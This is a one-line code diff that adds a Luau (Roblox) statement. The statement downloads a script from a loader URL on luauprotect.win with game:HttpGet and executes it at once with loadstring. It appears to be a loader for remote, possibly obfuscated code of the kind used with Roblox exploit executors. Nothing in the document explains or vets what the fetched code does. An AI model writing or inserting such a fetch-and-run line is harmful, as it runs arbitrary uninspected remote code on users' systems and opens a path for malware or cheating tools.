@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luauprotect.win/files/v1/loaders/6ac0c22a5bb59184b34276e1d6ad28e6169057fd"))()
